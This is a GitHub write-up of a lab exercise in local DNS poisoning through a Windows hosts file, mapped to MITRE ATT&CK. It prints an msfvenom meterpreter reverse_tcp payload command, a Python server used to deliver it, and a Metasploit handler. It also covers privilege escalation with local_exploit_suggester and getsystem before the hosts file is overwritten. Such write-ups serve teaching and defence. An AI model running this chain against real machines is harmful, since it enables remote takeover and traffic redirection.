# Local-DNS-poisoning-via-Hosts-file-modification
This a documentation of performing the local DNS poisoning attack via modifying the hosts file of the victim machine.

This attack was performed on a controlled LAN network. We all know about the DNS concepts which acts as the central hub for the identification of human-readable domain names to it's respective IP address.

<img width="924" height="435" alt="image" src="https://github.com/user-attachments/assets/173f245e-0d1c-4f5c-a347-db3c9caecdbe" />


## 🔒 MITRE ATT&CK Mapping

* **Tactical Goal:** Defense Evasion / Privilege Escalation
* **Technique:** [T1562.006 - Impair Defenses: Modify Name Resolution](https://attack.mitre.org/techniques/T1562/006/)

## The methodology
>>The victim machine is compromised by the tcp_reverse_shell payload using the metasploit framework
>>After the compromise of the machine, we need the administrative privilege to modify the Hosts file
>>The privilege escalation is done by the post exploit module post/multi/recon/local_exploit_suggester
>>Hosts file will the modified and the attack will be succeeded



## The PoC
>This attack will be performed in a controlled local network, so both the Attacker and the Victim's machine will be in the same network
<img width="920" height="472" alt="image" src="https://github.com/user-attachments/assets/aa4559bc-ec25-46d9-a9e1-928b53805027" />
<img width="1087" height="186" alt="image" src="https://github.com/user-attachments/assets/a49054b2-6069-4f3a-b876-3767461a851e" />

>Creating the payload in the next step and for that we'll be using the msfvenom to create the payload and this payload will be sent to victim's machine via hosting a local server in the attacker server and accessing the server to download the payload in the victim machine(For a simple explanation, the focus over here is Local DNS poisoning, the compromise can be done in many ways

> 🛈 *Note: Windows Defender was disabled for this simulation. In a real-world scenario, advanced evasion techniques or custom payloads would be required to bypass endpoint protections.*

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[attacker ip]  LPORT=[port] -f exe -o [payload_name] ---> Payload
python3 -m http.server 9876 ----> to host the local server

> Now open the metasploit framework using the command <msfconsole> and select the appropriate modules and the payload to simulate the attack. I have used the
[exploit/multi/handler] module and the [windows/x64/meterpreter/reverse_tcp] payload to perform this attack

>Set the LHOST and LPORT values and run the exploit. Once the payload was accessed by the victim machine, the reverse shell will be connected back to our machine in a meterpreter.

meterpreter/reverse_tcp ---> Staged payload
meterpreter_reverse_tcp ---> Single payload

<img width="957" height="489" alt="image" src="https://github.com/user-attachments/assets/1747434b-3be3-4893-a2a6-8619c9225f35" />

>Now we can perform the remote code execution in the victim machine and access modify the Hosts file. But before that we have to get privilege access and to get that the [post/multi/recon/local_exploit_suggester] module will be used to find the privilege escalation vulnerablities.

>After performing the post_escalation we can find the vulerablities and these can be exploited
<img width="1579" height="671" alt="image" src="https://github.com/user-attachments/assets/b3dad9da-ddb4-4510-9140-705563b77e46" />

>After using any of the vulnerability as the exploit, use the [getsystem] command and then check with [getuid] command. You will have now escalated privilege
<img width="1014" height="299" alt="image" src="https://github.com/user-attachments/assets/bb60805a-2889-4420-898d-9744e7124b75" />

>From here the Hosts file can be easily modified by the basic commands.

Hosts file location: /Windows/System32/drivers/etc/Hosts

<img width="986" height="297" alt="image" src="https://github.com/user-attachments/assets/c44eb22a-fbcb-4ffd-95f3-e6d8d4de8c06" />

>By the [download] and [upload] command the Hosts file can be modified and the Local DNS can be poisoned.


